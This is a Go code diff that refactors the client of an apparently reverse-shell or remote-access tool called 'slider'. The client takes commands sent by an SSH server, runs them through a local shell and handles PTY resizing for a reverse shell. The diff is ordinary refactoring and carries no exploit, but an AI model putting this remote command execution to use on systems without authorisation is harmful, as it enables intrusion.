@@ -9,7 +9,10 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"os"
 	"os/exec"
+	"slices"
+	"slider/pkg/interpreter"
 	"slider/pkg/sconn"
 	"slider/pkg/slog"
 	"time"
@@ -30,7 +33,8 @@ type client struct {
 	sshSession     *ssh.Session
 	sshClientConn  ssh.Conn
 	sshChannel     ssh.Channel
-	interpreter    Interpreter
+	interpreter    *interpreter.Interpreter
+	ptyFile        *os.File
 	connReqChannel <-chan *ssh.Request
 	debug          bool
 	disconnect     chan bool
@@ -39,21 +43,26 @@ type client struct {
 func NewClient(args []string) {
 	c := client{
 		Logger: slog.NewLogger("Client"),
-		interpreter: Interpreter{
-			size: sconn.TermSize{},
-		},
 	}
 
-	f := flag.NewFlagSet("Client", flag.ContinueOnError)
+	f := flag.NewFlagSet("client", flag.ContinueOnError)
 	f.BoolVar(&c.debug, "debug", false, "Verbose logging.")
 	f.DurationVar(&c.timeout, "timeout", 60*time.Second, "Set keepalive timeout in seconds.")
-	if parsErr := f.Parse(args); parsErr != nil {
+	if parsErr := f.Parse(args); parsErr != nil || slices.Contains(f.Args(), "help") {
+		f.Usage()
 		return
 	}
 
 	if c.debug {
 		c.Logger.WithDebug()
 	}
+
+	// Set interpreter
+	i, err := interpreter.NewInterpreter()
+	if err != nil {
+		c.Fatalf("%s", err)
+	}
+	c.setInterpreter(i)
 
 	args = f.Args()
 	c.serverAddr = args[0]
@@ -126,12 +135,14 @@ func (c *client) handleConnRequests(newChan <-chan ssh.NewChannel, connReqChan <
 		case "session-exec":
 			go c.sendCommandExec(sshClient, r)
 		case "window-change":
+			// Server only sends this Request if Interpreter is PTY,
+			// after Reverse Shell is sent, ergo PTY File has been created
 			c.Debugf("Server Requested window change: %s\n", r.Payload)
-			var termSize sconn.TermSize
+			var termSize interpreter.TermSize
 			if err := json.Unmarshal(r.Payload, &termSize); err != nil {
 				c.Fatalf("%s", err)
 			}
-			if sizeErr := pty.Setsize(c.interpreter.ptyF, &pty.Winsize{
+			if sizeErr := pty.Setsize(c.ptyFile, &pty.Winsize{
 				Rows: uint16(termSize.Rows),
 				Cols: uint16(termSize.Cols),
 			}); sizeErr != nil {
@@ -148,6 +159,10 @@ func (c *client) handleConnRequests(newChan <-chan ssh.NewChannel, connReqChan <
 	}
 }
 
+func (c *client) setInterpreter(i *interpreter.Interpreter) {
+	c.interpreter = i
+}
+
 func (c *client) sendCommandExec(sshClient *ssh.Client, initReq *ssh.Request) {
 	sshSession, err := sshClient.NewSession()
 	if err != nil {
@@ -155,31 +170,17 @@ func (c *client) sendCommandExec(sshClient *ssh.Client, initReq *ssh.Request) {
 	}
 	defer func() { _ = sshSession.Close() }()
 
-	err = c.setInterpreter()
-	if err != nil {
-		c.Errorf("%s", err)
-		_ = c.replyConnRequest(initReq, false, []byte("exec-failed"))
-		return
-	}
-	c.sshSession, err = sshClient.NewSession()
-
-	if err != nil {
-		c.Errorf("%s", err)
-	}
-	channel, sInErr := c.sshSession.StdinPipe()
+	channel, sInErr := sshSession.StdinPipe()
 	if sInErr != nil {
 		c.Errorf("Can not open Stdin Pipe on current Session")
 		return
 	}
-	defer func() {
-		_ = channel.Close()
-		_ = c.sshSession.Close()
-	}()
+	defer func() { _ = channel.Close() }()
 
 	c.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", initReq.Payload, initReq.Payload)
 
 	rcvCmd := string(initReq.Payload)
-	cmd := exec.Command(c.interpreter.shell, append(c.interpreter.cmdArgs, rcvCmd)...) //nolint:gosec
+	cmd := exec.Command(c.interpreter.Shell, append(c.interpreter.CmdArgs, rcvCmd)...) //nolint:gosec
 
 	// Since the payload contains the command to be executed, StdinPipe is not needed
 	stdout, pOutErr := cmd.StdoutPipe()
